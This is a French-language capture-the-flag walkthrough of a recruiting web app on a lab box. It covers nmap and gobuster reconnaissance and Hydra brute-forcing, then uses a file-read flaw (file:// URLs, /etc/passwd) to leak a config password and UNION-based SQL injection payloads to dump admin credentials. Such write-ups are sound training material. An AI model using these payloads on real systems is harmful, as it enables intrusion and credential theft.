# Recon

```bash
ping <TARGET_IP>

sudo nmap -sV -sC -oA nmap/initial <TARGET_IP>
```

### Résultats

|Port|État|Service|Version|
|---|---|---|---|
|22/tcp|Open|SSH|OpenSSH 8.2p1 Ubuntu|
|53/tcp|Open|DNS|ISC BIND 9.16.1|
|80/tcp|Open|HTTP|Apache 2.4.41|

Présence d'un serveur DNS et d'une application web.

---

# Analyse HTTP

```bash
curl -I http://<TARGET_IP>
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=...
Content-Type: text/html; charset=UTF-8
```

L'application utilise des sessions PHP.

---

# Énumération Web

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

301
/assets
/javascript
/mail
/phpmyadmin
/sitemap.xml

403
/.htaccess
/.htpasswd
/.hta
/server-status
```

|Chemin|Découverte|
|---|---|
|/mail|Username `hr` + `config.php`|
|/phpmyadmin|Interface phpMyAdmin|
|/sitemap.xml|Découverte de `api.php`|
|/api.php|Documentation de l'API|
|/file.php?cv=|Téléchargement de CV depuis une URL externe|

Documentation :

```text
The API supports fetching CVs from external URLs such as HTTP and HTTPS.
```

---

# Authentification

Découverte du compte :

```text
Username: hr
```

Analyse du formulaire :

```html
<input type="text" name="username">
<input type="password" name="password">
```

Analyse de la requête POST avec Burp Suite :

```http
POST /

username=po
password=po
login=
```

Réponse en cas d'échec :

```text
Invalid credentials
```

---

# Validation Hydra

Test avec un mot de passe invalide :

```bash
hydra -V -l hr -p test123 \
<TARGET_IP> \
http-post-form "/:username=^USER^&password=^PASS^&login=:F=Invalid credentials"
```

La condition d'échec est correctement détectée.

---

# Brute Force

```bash
hydra -V -t 32 -l hr \
-P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt \
<TARGET_IP> \
http-post-form "/:username=^USER^&password=^PASS^&login=:F=Invalid credentials"
```

Résultat :

```text
0 valid password found
```

Le mot de passe n'est pas présent dans cette wordlist.


# Analyse de l'API CV

```
The Recruit API is used internally to fetch and process candidate CVs from external sources.You can fetch a candidate CV using:/file.php?cv=<URL>
```


```bash
curl "http://<TARGET_IP>/file.php?cv=test"
curl "http://<TARGET_IP>/file.php?cv=config.php"
curl "http://<TARGET_IP>/file.php?cv=/etc/passwd"
curl "http://<TARGET_IP>/file.php?cv=http://<TARGET_IP>/config.php"

Only local files are allowed
```

L'analyse de la documentation laisse supposer l'utilisation de wrappers PHP. Un test avec le protocole `file://` est alors réalisé :

```bash
curl "http://<TARGET_IP>/file.php?cv=file:///var/www/html/config.php"

$HR_PASSWORD = 'hrpassword123';
```

L'endpoint est vulnérable à une **Local File Inclusion (LFI)** permettant de lire des fichiers arbitraires sur le serveur.

Les identifiants HR sont récupérés :

```
Username: hrPassword: hrpassword123
```


# Accès HR

Connexion avec les identifiants récupérés :

```text
Username: hr
Password: hrpassword123
```

Une fois authentifié, accès à :

```text
/dashboard.php
```

Flag utilisateur :

```text
THM{...}
```

---

# Analyse du Dashboard

Lecture du code source :

```bash
curl "http://<TARGET_IP>/file.php?cv=file:///var/www/html/dashboard.php"
```

Découverte de la requête SQL :

```php
$search = $_GET['search'];
$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
```

Le paramètre `search` est directement concaténé dans la requête SQL.

Vulnérabilité identifiée :

```text
SQL Injection
```

---

# Validation de la SQL Injection

Test d'un apostrophe :

```text
'
```

Erreur retournée :

```text
SQL Error:
You have an error in your SQL syntax...
```

L'application affiche les erreurs SQL.

---

# Détermination du nombre de colonnes

Tests :

```text
%' ORDER BY 1 -- -
%' ORDER BY 2 -- -
%' ORDER BY 3 -- -
%' ORDER BY 4 -- -
%' ORDER BY 5 -- -
```

Résultat :

```text
Unknown column '5' in 'order clause'
```

La requête retourne donc :

```text
4 colonnes
```

---

# Validation du UNION SELECT

Payload :

```sql
%' UNION SELECT 1,2,3,4 -- -
```

Aucune erreur retournée.

Le `UNION SELECT` est valide.

---

# Extraction des identifiants administrateur

Le code de connexion indique :

```php
SELECT password FROM users WHERE username = ?
```

Présence d'une table :

```text
users
```

Extraction des identifiants :

```sql
%' UNION SELECT 1,username,password,4 FROM users -- -
```

Résultat :

```text
1 | admin | admin@001admin | 4
```

Identifiants administrateur :

```text
Username: admin
Password: admin@001admin
```

---

# Accès Administrateur

Connexion :

```text
admin
admin@001admin
```

Accès au dashboard administrateur :

```text
/dashboard.php
```

Le code source indique :

```php
if ($_SESSION['role'] === 'admin') {
    $flagPath = '/admin.txt';
}
```

Le flag administrateur est automatiquement affiché.

Flag final :

```text
THM{...}
```
